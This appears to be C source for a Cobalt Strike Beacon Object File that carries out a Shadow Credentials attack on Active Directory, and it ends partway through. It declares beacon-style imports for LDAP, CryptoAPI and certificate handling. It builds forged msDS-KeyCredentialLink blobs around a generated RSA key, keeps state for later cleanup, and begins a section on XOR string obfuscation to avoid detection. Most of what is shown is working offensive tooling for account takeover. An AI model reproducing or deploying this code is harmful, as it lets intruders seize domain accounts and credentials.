/* Prevent winsock.h/winsock2.h conflict */
#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS

/* Use old-style swprintf (no size parameter) for MSVC compatibility */
#define _CRT_NON_CONFORMING_SWPRINTFS

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <wincrypt.h>
#include <winldap.h>
#include <dsgetdc.h>
#include <lm.h>
#include <time.h>

typedef void* LPUNKNOWN;
typedef WCHAR OLECHAR;
typedef OLECHAR* LPOLESTR;
typedef OLECHAR* BSTR;
typedef LONG DISPID;
typedef unsigned int UINT;

#define CLSCTX_INPROC_SERVER 0x1

#include "beacon.h"
#define CALLBACK_OUTPUT 0x0
#define CALLBACK_ERROR 0x0d

DECLSPEC_IMPORT int WINAPI USER32$wsprintfW(LPWSTR, LPCWSTR, ...);
#define SWPRINTF USER32$wsprintfW

#define KCEI_VERSION        0x00
#define KCEI_KEYID          0x01
#define KCEI_KEYHASH        0x02
#define KCEI_KEYMATERIAL    0x03
#define KCEI_KEYUSAGE       0x04
#define KCEI_KEYSOURCE      0x05
#define KCEI_DEVICEID       0x06
#define KCEI_CUSTOMKEYINFO  0x07
#define KCEI_KEYLASTLOGON   0x08
#define KCEI_KEYCREATION    0x09

#define KEY_USAGE_NGC       0x01
#define KEY_USAGE_FIDO      0x07
#define KEY_SOURCE_AD       0x00
#define KEY_SOURCE_AZUREAD  0x01

/* LDAP constants */
#ifndef LDAP_PORT
#define LDAP_PORT 389
#endif
#ifndef LDAP_SCOPE_SUBTREE
#define LDAP_SCOPE_SUBTREE 0x02
#endif
#ifndef LDAP_AUTH_NEGOTIATE
#define LDAP_AUTH_NEGOTIATE 0x0486
#endif
#ifndef LDAP_OPT_REFERRALS
#define LDAP_OPT_REFERRALS 0x08
#endif
#ifndef LDAP_SUCCESS
#define LDAP_SUCCESS 0x00
#endif
#ifndef LDAP_MOD_ADD
#define LDAP_MOD_ADD 0x00
#endif
#ifndef LDAP_MOD_BVALUES
#define LDAP_MOD_BVALUES 0x80
#endif

/* BCRYPT_RSAKEY_BLOB magic */
#define BCRYPT_RSAPUBLIC_MAGIC  0x31415352  /* "RSA1" */

#define szOID_NT_PRINCIPAL_NAME "1.3.6.1.4.1.311.20.2.3"

/* Global state for Shadow Credential cleanup */
static WCHAR* g_wszKeyCredValue = NULL;
static WCHAR g_wszTargetDN[512] = { 0 };
static char g_szDomain[256] = { 0 };
static GUID g_deviceId = { 0 };

/* Crypto - ADVAPI32 */
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptAcquireContextW(HCRYPTPROV*, LPCWSTR, LPCWSTR, DWORD, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptReleaseContext(HCRYPTPROV, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptGenKey(HCRYPTPROV, ALG_ID, DWORD, HCRYPTKEY*);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptDestroyKey(HCRYPTKEY);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptGenRandom(HCRYPTPROV, DWORD, BYTE*);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptCreateHash(HCRYPTPROV, ALG_ID, HCRYPTKEY, DWORD, HCRYPTHASH*);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptHashData(HCRYPTHASH, const BYTE*, DWORD, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptGetHashParam(HCRYPTHASH, DWORD, BYTE*, DWORD*, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptDestroyHash(HCRYPTHASH);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptExportKey(HCRYPTKEY, HCRYPTKEY, DWORD, DWORD, BYTE*, DWORD*);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$ConvertSidToStringSidA(PSID, LPSTR*);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$IsValidSid(PSID);
DECLSPEC_IMPORT DWORD WINAPI ADVAPI32$GetLengthSid(PSID);

/* Crypto - CRYPT32 */
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptEncodeObjectEx(DWORD, LPCSTR, const void*, DWORD, PCRYPT_ENCODE_PARA, void*, DWORD*);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptDecodeObjectEx(DWORD, LPCSTR, const BYTE*, DWORD, DWORD, PCRYPT_DECODE_PARA, void*, DWORD*);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptBinaryToStringA(const BYTE*, DWORD, DWORD, LPSTR, DWORD*);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptStringToBinaryA(LPCSTR, DWORD, DWORD, BYTE*, DWORD*, DWORD*, DWORD*);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CertStrToNameA(DWORD, LPCSTR, DWORD, void*, BYTE*, DWORD*, LPCSTR*);
DECLSPEC_IMPORT PCCERT_CONTEXT WINAPI CRYPT32$CertCreateCertificateContext(DWORD, const BYTE*, DWORD);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CertFreeCertificateContext(PCCERT_CONTEXT);
DECLSPEC_IMPORT HCERTSTORE WINAPI CRYPT32$CertOpenStore(LPCSTR, DWORD, HCRYPTPROV_LEGACY, DWORD, const void*);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CertCloseStore(HCERTSTORE, DWORD);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CertAddCertificateContextToStore(HCERTSTORE, PCCERT_CONTEXT, DWORD, PCCERT_CONTEXT*);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CertSetCertificateContextProperty(PCCERT_CONTEXT, DWORD, DWORD, const void*);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$PFXExportCertStoreEx(HCERTSTORE, CRYPT_DATA_BLOB*, LPCWSTR, void*, DWORD);
DECLSPEC_IMPORT HCERTSTORE WINAPI CRYPT32$PFXImportCertStore(CRYPT_DATA_BLOB*, LPCWSTR, DWORD);
DECLSPEC_IMPORT PCCERT_CONTEXT WINAPI CRYPT32$CertEnumCertificatesInStore(HCERTSTORE, PCCERT_CONTEXT);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptAcquireCertificatePrivateKey(PCCERT_CONTEXT, DWORD, void*, HCRYPTPROV_OR_NCRYPT_KEY_HANDLE*, DWORD*, BOOL*);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptExportPublicKeyInfo(HCRYPTPROV, DWORD, DWORD, PCERT_PUBLIC_KEY_INFO, DWORD*);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptSignAndEncodeCertificate(HCRYPTPROV_OR_NCRYPT_KEY_HANDLE, DWORD, DWORD, LPCSTR, const void*, PCRYPT_ALGORITHM_IDENTIFIER, const void*, BYTE*, DWORD*);
DECLSPEC_IMPORT HCRYPTMSG WINAPI CRYPT32$CryptMsgOpenToEncode(DWORD, DWORD, DWORD, const void*, LPSTR, PCMSG_STREAM_INFO);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptMsgUpdate(HCRYPTMSG, const BYTE*, DWORD, BOOL);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptMsgGetParam(HCRYPTMSG, DWORD, DWORD, void*, DWORD*);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptMsgClose(HCRYPTMSG);

/* COM */
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT void WINAPI OLE32$CoUninitialize(void);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateGuid(GUID*);

/* NetAPI */
DECLSPEC_IMPORT DWORD WINAPI NETAPI32$DsGetDcNameW(LPCWSTR, LPCWSTR, GUID*, LPCWSTR, ULONG, PDOMAIN_CONTROLLER_INFOW*);
DECLSPEC_IMPORT DWORD WINAPI NETAPI32$NetApiBufferFree(LPVOID);

/* LDAP */
DECLSPEC_IMPORT LDAP* WINAPI WLDAP32$ldap_initW(PWSTR, ULONG);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_bind_sW(LDAP*, PWSTR, PWSTR, ULONG);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_search_sW(LDAP*, PWSTR, ULONG, PWSTR, PWSTR*, ULONG, LDAPMessage**);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_unbind(LDAP*);
DECLSPEC_IMPORT LDAPMessage* WINAPI WLDAP32$ldap_first_entry(LDAP*, LDAPMessage*);
DECLSPEC_IMPORT PWSTR WINAPI WLDAP32$ldap_get_dnW(LDAP*, LDAPMessage*);
DECLSPEC_IMPORT struct berval** WINAPI WLDAP32$ldap_get_values_lenW(LDAP*, LDAPMessage*, PWSTR);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_value_free_len(struct berval**);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_msgfree(LDAPMessage*);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_set_optionW(LDAP*, int, const void*);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_modify_sW(LDAP*, PWSTR, LDAPModW**);
DECLSPEC_IMPORT void WINAPI WLDAP32$ldap_memfreeW(PWSTR);

/* Kernel32 */
DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalAlloc(UINT, SIZE_T);
DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalFree(HLOCAL);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$FreeLibrary(HMODULE);
DECLSPEC_IMPORT int WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
DECLSPEC_IMPORT int WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);
DECLSPEC_IMPORT void WINAPI KERNEL32$GetSystemTime(LPSYSTEMTIME);
DECLSPEC_IMPORT void WINAPI KERNEL32$GetSystemTimeAsFileTime(LPFILETIME);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$GetComputerNameExW(int, LPWSTR, LPDWORD);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$SystemTimeToFileTime(const SYSTEMTIME*, LPFILETIME);

/* MSVCRT */
DECLSPEC_IMPORT void* __cdecl MSVCRT$malloc(size_t);
DECLSPEC_IMPORT void __cdecl MSVCRT$free(void*);
DECLSPEC_IMPORT void* __cdecl MSVCRT$memset(void*, int, size_t);
DECLSPEC_IMPORT void* __cdecl MSVCRT$memcpy(void*, const void*, size_t);
DECLSPEC_IMPORT int __cdecl MSVCRT$memcmp(const void*, const void*, size_t);
DECLSPEC_IMPORT size_t __cdecl MSVCRT$strlen(const char*);
DECLSPEC_IMPORT size_t __cdecl MSVCRT$wcslen(const wchar_t*);
DECLSPEC_IMPORT int __cdecl MSVCRT$sprintf(char*, const char*, ...);
DECLSPEC_IMPORT int __cdecl MSVCRT$swprintf(wchar_t*, size_t, const wchar_t*, ...);
DECLSPEC_IMPORT char* __cdecl MSVCRT$strcpy(char*, const char*);
DECLSPEC_IMPORT char* __cdecl MSVCRT$strcat(char*, const char*);
DECLSPEC_IMPORT char* __cdecl MSVCRT$strchr(const char*, int);
DECLSPEC_IMPORT wchar_t* __cdecl MSVCRT$wcscpy(wchar_t*, const wchar_t*);
DECLSPEC_IMPORT wchar_t* __cdecl MSVCRT$wcscat(wchar_t*, const wchar_t*);
DECLSPEC_IMPORT int __cdecl MSVCRT$_stricmp(const char*, const char*);
DECLSPEC_IMPORT int __cdecl MSVCRT$rand(void);
DECLSPEC_IMPORT void __cdecl MSVCRT$srand(unsigned int);
DECLSPEC_IMPORT time_t __cdecl MSVCRT$time(time_t*);

/* DFR macros */
#define WSAStartup WS2_32$WSAStartup
#define WSACleanup WS2_32$WSACleanup
#define socket WS2_32$socket
#define connect WS2_32$connect
#define send WS2_32$send
#define recv WS2_32$recv
#define closesocket WS2_32$closesocket
#define gethostbyname WS2_32$gethostbyname
#define inet_addr WS2_32$inet_addr
#define htons WS2_32$htons
#define htonl WS2_32$htonl
#define ntohl WS2_32$ntohl

#define CryptAcquireContextW ADVAPI32$CryptAcquireContextW
#define CryptReleaseContext ADVAPI32$CryptReleaseContext
#define CryptGenKey ADVAPI32$CryptGenKey
#define CryptDestroyKey ADVAPI32$CryptDestroyKey
#define CryptGenRandom ADVAPI32$CryptGenRandom
#define CryptCreateHash ADVAPI32$CryptCreateHash
#define CryptHashData ADVAPI32$CryptHashData
#define CryptGetHashParam ADVAPI32$CryptGetHashParam
#define CryptDestroyHash ADVAPI32$CryptDestroyHash
#define CryptExportKey ADVAPI32$CryptExportKey
#define ConvertSidToStringSidA ADVAPI32$ConvertSidToStringSidA
#define IsValidSid ADVAPI32$IsValidSid
#define GetLengthSid ADVAPI32$GetLengthSid

#define CryptEncodeObjectEx CRYPT32$CryptEncodeObjectEx
#define CryptDecodeObjectEx CRYPT32$CryptDecodeObjectEx
#define CryptBinaryToStringA CRYPT32$CryptBinaryToStringA
#define CryptStringToBinaryA CRYPT32$CryptStringToBinaryA
#define CertStrToNameA CRYPT32$CertStrToNameA
#define CertCreateCertificateContext CRYPT32$CertCreateCertificateContext
#define CertFreeCertificateContext CRYPT32$CertFreeCertificateContext
#define CertOpenStore CRYPT32$CertOpenStore
#define CertCloseStore CRYPT32$CertCloseStore
#define CertAddCertificateContextToStore CRYPT32$CertAddCertificateContextToStore
#define CertSetCertificateContextProperty CRYPT32$CertSetCertificateContextProperty
#define PFXExportCertStoreEx CRYPT32$PFXExportCertStoreEx
#define PFXImportCertStore CRYPT32$PFXImportCertStore
#define CertEnumCertificatesInStore CRYPT32$CertEnumCertificatesInStore
#define CryptAcquireCertificatePrivateKey CRYPT32$CryptAcquireCertificatePrivateKey
#define CryptExportPublicKeyInfo CRYPT32$CryptExportPublicKeyInfo
#define CryptSignAndEncodeCertificate CRYPT32$CryptSignAndEncodeCertificate
#define CryptMsgOpenToEncode CRYPT32$CryptMsgOpenToEncode
#define CryptMsgUpdate CRYPT32$CryptMsgUpdate
#define CryptMsgGetParam CRYPT32$CryptMsgGetParam
#define CryptMsgClose CRYPT32$CryptMsgClose

#define CoInitializeEx OLE32$CoInitializeEx
#define CoUninitialize OLE32$CoUninitialize
#define CoCreateGuid OLE32$CoCreateGuid

#define DsGetDcNameW NETAPI32$DsGetDcNameW
#define NetApiBufferFree NETAPI32$NetApiBufferFree

#define ldap_initW WLDAP32$ldap_initW
#define ldap_bind_sW WLDAP32$ldap_bind_sW
#define ldap_search_sW WLDAP32$ldap_search_sW
#define ldap_unbind WLDAP32$ldap_unbind
#define ldap_first_entry WLDAP32$ldap_first_entry
#define ldap_get_dnW WLDAP32$ldap_get_dnW
#define ldap_get_values_lenW WLDAP32$ldap_get_values_lenW
#define ldap_value_free_len WLDAP32$ldap_value_free_len
#define ldap_msgfree WLDAP32$ldap_msgfree
#define ldap_set_optionW WLDAP32$ldap_set_optionW
#define ldap_modify_sW WLDAP32$ldap_modify_sW
#define ldap_memfreeW WLDAP32$ldap_memfreeW

#define LocalAlloc KERNEL32$LocalAlloc
#define LocalFree KERNEL32$LocalFree
#define LoadLibraryA KERNEL32$LoadLibraryA
#define GetProcAddress KERNEL32$GetProcAddress
#define FreeLibrary KERNEL32$FreeLibrary
#define MultiByteToWideChar KERNEL32$MultiByteToWideChar
#define WideCharToMultiByte KERNEL32$WideCharToMultiByte
#define GetSystemTime KERNEL32$GetSystemTime
#define GetSystemTimeAsFileTime KERNEL32$GetSystemTimeAsFileTime
#define GetLastError KERNEL32$GetLastError
#define GetComputerNameExW KERNEL32$GetComputerNameExW
#define SystemTimeToFileTime KERNEL32$SystemTimeToFileTime

#define malloc MSVCRT$malloc
#define free MSVCRT$free
#define memset MSVCRT$memset
#define memcpy MSVCRT$memcpy
#define memcmp MSVCRT$memcmp
#define strlen MSVCRT$strlen
#define wcslen MSVCRT$wcslen
#define sprintf MSVCRT$sprintf
#define swprintf MSVCRT$swprintf
#define strcpy MSVCRT$strcpy
#define strcat MSVCRT$strcat
#define strchr MSVCRT$strchr
#define wcscpy MSVCRT$wcscpy
#define wcscat MSVCRT$wcscat
#define _stricmp MSVCRT$_stricmp
#define rand MSVCRT$rand
#define srand MSVCRT$srand
#define time MSVCRT$time

/*
 * =============================================================================
 * ASN.1/DER Encoding Functions
 * =============================================================================
 */

static int EncodeLength(BYTE* buf, int len) {
    if (len < 128) {
        buf[0] = (BYTE)len;
        return 1;
    }
    else if (len < 256) {
        buf[0] = 0x81;
        buf[1] = (BYTE)len;
        return 2;
    }
    else if (len < 65536) {
        buf[0] = 0x82;
        buf[1] = (BYTE)(len >> 8);
        buf[2] = (BYTE)(len & 0xFF);
        return 3;
    }
    else {
        buf[0] = 0x83;
        buf[1] = (BYTE)(len >> 16);
        buf[2] = (BYTE)((len >> 8) & 0xFF);
        buf[3] = (BYTE)(len & 0xFF);
        return 4;
    }
}

static int DecodeLength(BYTE* data, int offset, int* length) {
    if ((data[offset] & 0x80) == 0) {
        *length = data[offset];
        return 1;
    }
    else {
        int numBytes = data[offset] & 0x7F;
        int i;
        *length = 0;
        for (i = 1; i <= numBytes; i++) {
            *length = (*length << 8) | data[offset + i];
        }
        return 1 + numBytes;
    }
}

static BYTE* BuildSequence(BYTE* content, int contentLen, int* outLen) {
    int lenSize;
    BYTE lenBuf[4];
    BYTE* result;
    lenSize = EncodeLength(lenBuf, contentLen);
    *outLen = 1 + lenSize + contentLen;
    result = (BYTE*)malloc(*outLen);
    result[0] = 0x30;
    memcpy(result + 1, lenBuf, lenSize);
    memcpy(result + 1 + lenSize, content, contentLen);
    return result;
}

static BYTE* BuildInteger(int value, int* outLen) {
    BYTE* result;
    if (value >= 0 && value < 128) {
        *outLen = 3;
        result = (BYTE*)malloc(3);
        result[0] = 0x02;
        result[1] = 0x01;
        result[2] = (BYTE)value;
    }
    else if (value >= 0 && value < 256) {
        *outLen = 4;
        result = (BYTE*)malloc(4);
        result[0] = 0x02;
        result[1] = 0x02;
        result[2] = 0x00;
        result[3] = (BYTE)value;
    }
    else {
        *outLen = 6;
        result = (BYTE*)malloc(6);
        result[0] = 0x02;
        result[1] = 0x04;
        result[2] = (BYTE)(value >> 24);
        result[3] = (BYTE)(value >> 16);
        result[4] = (BYTE)(value >> 8);
        result[5] = (BYTE)value;
    }
    return result;
}

static BYTE* BuildIntegerFromBytes(BYTE* data, int dataLen, int* outLen) {
    BYTE* result;
    int lenSize;
    BYTE lenBuf[4];
    int needPadding = (data[0] & 0x80) ? 1 : 0;
    int totalDataLen = dataLen + needPadding;
    lenSize = EncodeLength(lenBuf, totalDataLen);
    *outLen = 1 + lenSize + totalDataLen;
    result = (BYTE*)malloc(*outLen);
    result[0] = 0x02;
    memcpy(result + 1, lenBuf, lenSize);
    if (needPadding) {
        result[1 + lenSize] = 0x00;
        memcpy(result + 2 + lenSize, data, dataLen);
    }
    else {
        memcpy(result + 1 + lenSize, data, dataLen);
    }
    return result;
}

static BYTE* BuildOctetString(BYTE* data, int dataLen, int* outLen) {
    BYTE* result;
    int lenSize;
    BYTE lenBuf[4];
    lenSize = EncodeLength(lenBuf, dataLen);
    *outLen = 1 + lenSize + dataLen;
    result = (BYTE*)malloc(*outLen);
    result[0] = 0x04;
    memcpy(result + 1, lenBuf, lenSize);
    memcpy(result + 1 + lenSize, data, dataLen);
    return result;
}

static BYTE* BuildBitString(BYTE* data, int dataLen, int* outLen) {
    BYTE* result;
    int lenSize;
    BYTE lenBuf[4];
    lenSize = EncodeLength(lenBuf, dataLen + 1);
    *outLen = 1 + lenSize + 1 + dataLen;
    result = (BYTE*)malloc(*outLen);
    result[0] = 0x03;
    memcpy(result + 1, lenBuf, lenSize);
    result[1 + lenSize] = 0x00;
    memcpy(result + 2 + lenSize, data, dataLen);
    return result;
}

static BYTE* BuildContextTag(int tagNum, BYTE* content, int contentLen, int* outLen) {
    BYTE* result;
    int lenSize;
    BYTE lenBuf[4];
    lenSize = EncodeLength(lenBuf, contentLen);
    *outLen = 1 + lenSize + contentLen;
    result = (BYTE*)malloc(*outLen);
    result[0] = 0xA0 | tagNum;
    memcpy(result + 1, lenBuf, lenSize);
    memcpy(result + 1 + lenSize, content, contentLen);
    return result;
}

static BYTE* BuildApplication(int appNum, BYTE* content, int contentLen, int* outLen) {
    BYTE* result;
    int lenSize;
    BYTE lenBuf[4];
    lenSize = EncodeLength(lenBuf, contentLen);
    *outLen = 1 + lenSize + contentLen;
    result = (BYTE*)malloc(*outLen);
    result[0] = 0x60 | appNum;
    memcpy(result + 1, lenBuf, lenSize);
    memcpy(result + 1 + lenSize, content, contentLen);
    return result;
}

static BYTE* BuildGeneralString(const char* str, int* outLen) {
    int strLen = (int)strlen(str);
    int lenSize;
    BYTE lenBuf[4];
    BYTE* result;
    lenSize = EncodeLength(lenBuf, strLen);
    *outLen = 1 + lenSize + strLen;
    result = (BYTE*)malloc(*outLen);
    result[0] = 0x1B;
    memcpy(result + 1, lenBuf, lenSize);
    memcpy(result + 1 + lenSize, str, strLen);
    return result;
}

static BYTE* BuildGeneralizedTime(const char* timeStr, int* outLen) {
    int strLen = (int)strlen(timeStr);
    BYTE* result;
    *outLen = 2 + strLen;
    result = (BYTE*)malloc(*outLen);
    result[0] = 0x18;
    result[1] = (BYTE)strLen;
    memcpy(result + 2, timeStr, strLen);
    return result;
}

/*
 * =============================================================================
 * SHA-256 Hash Function
 * =============================================================================
 */

static BOOL ComputeSha256(BYTE* data, int dataLen, BYTE* hash) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    DWORD hashLen = 32;
    BOOL result = FALSE;

    if (CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        if (CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
            if (CryptHashData(hHash, data, dataLen, 0)) {
                if (CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashLen, 0)) {
                    result = TRUE;
                }
            }
            CryptDestroyHash(hHash);
        }
        CryptReleaseContext(hProv, 0);
    }
    return result;
}

static void ComputeSha1(BYTE* data, int dataLen, BYTE* hash) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    DWORD hashLen = 20;
    if (CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        if (CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash)) {
            CryptHashData(hHash, data, dataLen, 0);
            CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashLen, 0);
            CryptDestroyHash(hHash);
        }
        CryptReleaseContext(hProv, 0);
    }
}

/*
 * =============================================================================
 * KeyCredential Blob Builder
 * =============================================================================
 */

static BYTE* BuildKeyCredentialEntry(BYTE identifier, BYTE* data, int dataLen, int* outLen) {
    BYTE* result;
    *outLen = 3 + dataLen;
    result = (BYTE*)malloc(*outLen);
    /* Length (2 bytes, little-endian) + Type (1 byte) + Data */
    result[0] = (BYTE)(dataLen & 0xFF);
    result[1] = (BYTE)((dataLen >> 8) & 0xFF);
    result[2] = identifier;
    memcpy(result + 3, data, dataLen);
    return result;
}

static BYTE* BuildKeyCredentialBlob(BYTE* publicKey, int publicKeyLen, GUID* deviceId, int* outLen) {
    BYTE* result;
    BYTE* binaryProperties;
    int bpLen = 0;
    BYTE keyId[32];
    BYTE keyHash[32];
    FILETIME ft;
    BYTE customKeyInfo[2] = { 0x01, 0x00 };  /* Version=1, Flags=0 */
    BYTE keyUsage[1] = { KEY_USAGE_NGC };
    BYTE keySource[1] = { KEY_SOURCE_AD };
    int offset;

    /* Build entries for hashing (all entries after KeyHash) */
    BYTE* keyMaterialEntry;
    BYTE* keyUsageEntry;
    BYTE* keySourceEntry;
    BYTE* deviceIdEntry;
    BYTE* customKeyInfoEntry;
    BYTE* lastLogonEntry;
    BYTE* creationEntry;
    int kmLen, kuLen, ksLen, diLen, ckiLen, llLen, ctLen;

    GetSystemTimeAsFileTime(&ft);
    BYTE fileTimeBytes[8];
    memcpy(fileTimeBytes, &ft, 8);

    keyMaterialEntry = BuildKeyCredentialEntry(KCEI_KEYMATERIAL, publicKey, publicKeyLen, &kmLen);
    keyUsageEntry = BuildKeyCredentialEntry(KCEI_KEYUSAGE, keyUsage, 1, &kuLen);
    keySourceEntry = BuildKeyCredentialEntry(KCEI_KEYSOURCE, keySource, 1, &ksLen);
    deviceIdEntry = BuildKeyCredentialEntry(KCEI_DEVICEID, (BYTE*)deviceId, 16, &diLen);
    customKeyInfoEntry = BuildKeyCredentialEntry(KCEI_CUSTOMKEYINFO, customKeyInfo, 2, &ckiLen);
    lastLogonEntry = BuildKeyCredentialEntry(KCEI_KEYLASTLOGON, fileTimeBytes, 8, &llLen);
    creationEntry = BuildKeyCredentialEntry(KCEI_KEYCREATION, fileTimeBytes, 8, &ctLen);

    /* Concatenate all entries for hash */
    bpLen = kmLen + kuLen + ksLen + diLen + ckiLen + llLen + ctLen;
    binaryProperties = (BYTE*)malloc(bpLen);
    offset = 0;
    memcpy(binaryProperties + offset, keyMaterialEntry, kmLen); offset += kmLen;
    memcpy(binaryProperties + offset, keyUsageEntry, kuLen); offset += kuLen;
    memcpy(binaryProperties + offset, keySourceEntry, ksLen); offset += ksLen;
    memcpy(binaryProperties + offset, deviceIdEntry, diLen); offset += diLen;
    memcpy(binaryProperties + offset, customKeyInfoEntry, ckiLen); offset += ckiLen;
    memcpy(binaryProperties + offset, lastLogonEntry, llLen); offset += llLen;
    memcpy(binaryProperties + offset, creationEntry, ctLen); offset += ctLen;

    /* KeyID = SHA256(publicKey) */
    ComputeSha256(publicKey, publicKeyLen, keyId);

    /* KeyHash = SHA256(binaryProperties) */
    ComputeSha256(binaryProperties, bpLen, keyHash);

    /* Build final blob: Version + KeyID + KeyHash + binaryProperties */
    BYTE* keyIdEntry;
    BYTE* keyHashEntry;
    int kiLen, khLen;

    keyIdEntry = BuildKeyCredentialEntry(KCEI_KEYID, keyId, 32, &kiLen);
    keyHashEntry = BuildKeyCredentialEntry(KCEI_KEYHASH, keyHash, 32, &khLen);

    *outLen = 4 + kiLen + khLen + bpLen;
    result = (BYTE*)malloc(*outLen);

    /* Version 0x200 (little-endian) */
    result[0] = 0x00;
    result[1] = 0x02;
    result[2] = 0x00;
    result[3] = 0x00;

    offset = 4;
    memcpy(result + offset, keyIdEntry, kiLen); offset += kiLen;
    memcpy(result + offset, keyHashEntry, khLen); offset += khLen;
    memcpy(result + offset, binaryProperties, bpLen);

    /* Cleanup */
    free(keyMaterialEntry);
    free(keyUsageEntry);
    free(keySourceEntry);
    free(deviceIdEntry);
    free(customKeyInfoEntry);
    free(lastLogonEntry);
    free(creationEntry);
    free(keyIdEntry);
    free(keyHashEntry);
    free(binaryProperties);

    return result;
}

/*
 * =============================================================================
 * RSA Key Export in BCRYPT_RSAKEY_BLOB Format
 * =============================================================================
 */

static BYTE* ExportRSAPublicKeyBCrypt(HCRYPTKEY hKey, int* outLen) {
    BYTE* pubKeyBlob = NULL;
    DWORD pubKeyBlobLen = 0;
    BYTE* bcryptBlob = NULL;

    /* Export in PUBLICKEYBLOB format */
    if (!CryptExportKey(hKey, 0, PUBLICKEYBLOB, 0, NULL, &pubKeyBlobLen)) {
        return NULL;
    }

    pubKeyBlob = (BYTE*)malloc(pubKeyBlobLen);
    if (!CryptExportKey(hKey, 0, PUBLICKEYBLOB, 0, pubKeyBlob, &pubKeyBlobLen)) {
        free(pubKeyBlob);
        return NULL;
    }

    /* PUBLICKEYBLOB format:
     * BLOBHEADER (8 bytes) + RSAPUBKEY (12 bytes) + modulus (bitlen/8 bytes)
     * RSAPUBKEY: magic (4) + bitlen (4) + pubexp (4)
     */
    DWORD bitLen = *(DWORD*)(pubKeyBlob + 12);
    DWORD modulusLen = bitLen / 8;
    DWORD exponent = *(DWORD*)(pubKeyBlob + 16);
    BYTE* modulus = pubKeyBlob + 20;

    /* Build BCRYPT_RSAKEY_BLOB */
    /* BCRYPT_RSAKEY_BLOB: Magic(4) + BitLength(4) + cbPublicExp(4) + cbModulus(4) + cbPrime1(4) + cbPrime2(4) + Exponent + Modulus */
    int expLen = 3;  /* exponent 65537 = 0x010001 = 3 bytes */
    *outLen = 24 + expLen + modulusLen;
    bcryptBlob = (BYTE*)malloc(*outLen);

    *(DWORD*)(bcryptBlob + 0) = BCRYPT_RSAPUBLIC_MAGIC;
    *(DWORD*)(bcryptBlob + 4) = bitLen;
    *(DWORD*)(bcryptBlob + 8) = expLen;
    *(DWORD*)(bcryptBlob + 12) = modulusLen;
    *(DWORD*)(bcryptBlob + 16) = 0;  /* cbPrime1 */
    *(DWORD*)(bcryptBlob + 20) = 0;  /* cbPrime2 */

    /* Exponent (big-endian) */
    bcryptBlob[24] = 0x01;
    bcryptBlob[25] = 0x00;
    bcryptBlob[26] = 0x01;

    /* Modulus - need to reverse because CryptoAPI exports little-endian but BCRYPT expects big-endian */
    int i;
    for (i = 0; i < (int)modulusLen; i++) {
        bcryptBlob[27 + i] = modulus[modulusLen - 1 - i];
    }

    free(pubKeyBlob);
    return bcryptBlob;
}

/*
 * =============================================================================
 * String Obfuscation - XOR deobfuscation at runtime
 * =============================================================================
 */

#define XOR_KEY 0x5A

 /* Deobfuscate XOR'd wide string in-place */
